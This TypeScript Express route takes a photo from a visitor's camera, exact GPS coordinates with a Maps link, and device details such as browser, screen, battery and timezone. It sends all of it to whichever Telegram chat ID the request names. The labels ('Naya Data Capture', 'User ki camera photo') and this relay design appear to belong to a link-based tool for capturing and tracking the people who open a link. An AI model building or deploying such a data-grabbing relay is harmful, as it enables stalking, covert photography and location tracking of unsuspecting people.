import { Router, type IRouter } from "express";
import { sendTextToChat, sendPhotoToChat } from "../lib/telegram";
import { SubmitCaptureBody, SubmitCaptureResponse } from "@workspace/api-zod";

const router: IRouter = Router();

router.post("/capture", async (req, res): Promise<void> => {
  const parsed = SubmitCaptureBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }

  const { chatId, photo, location, deviceInfo } = parsed.data;

  try {
    // Build device info message
    let message = `📋 *Naya Data Capture*\n\n`;
    message += `👤 *Chat ID:* \`${chatId}\`\n\n`;

    if (location) {
      const lat = location.latitude ?? 0;
      const lng = location.longitude ?? 0;
      message += `📍 *Location:*\n`;
      message += `  Latitude: ${lat.toFixed(6)}\n`;
      message += `  Longitude: ${lng.toFixed(6)}\n`;
      if (location.accuracy != null) {
        message += `  Accuracy: ±${Math.round(location.accuracy)}m\n`;
      }
      if (location.city) {
        message += `  City: ${location.city}\n`;
      }
      message += `  Maps: https://maps.google.com/?q=${lat},${lng}\n\n`;
    } else {
      message += `📍 *Location:* Allowed nahi kiya\n\n`;
    }

    if (deviceInfo) {
      message += `📱 *Device Info:*\n`;
      message += `  Platform: ${deviceInfo.platform}\n`;
      message += `  Browser: ${(deviceInfo.userAgent ?? "").slice(0, 80)}\n`;
      message += `  Screen: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n`;
      message += `  Language: ${deviceInfo.language}\n`;
      message += `  Timezone: ${deviceInfo.timezone}\n`;
      if (deviceInfo.battery != null) {
        message += `  Battery: ${deviceInfo.battery}%\n`;
      }
      if (deviceInfo.connectionType) {
        message += `  Connection: ${deviceInfo.connectionType}\n`;
      }
    }

    // Send text message first
    await sendTextToChat(chatId, message);

    // Send photo if available
    if (photo) {
      await sendPhotoToChat(chatId, photo, "📸 User ki camera photo");
    } else {
      await sendTextToChat(chatId, "📸 Camera photo: Allow nahi kiya gaya");
    }

    req.log.info({ chatId }, "Capture data sent to Telegram");

    const result = SubmitCaptureResponse.parse({
      success: true,
      message: "Aapki jaankari bot ko bhej di gayi hai!",
    });
    res.json(result);
  } catch (err) {
    req.log.error({ err, chatId }, "Failed to send capture data to Telegram");
    res.status(500).json({ error: "Telegram pe data bhejne mein error aayi" });
  }
});

export default router;
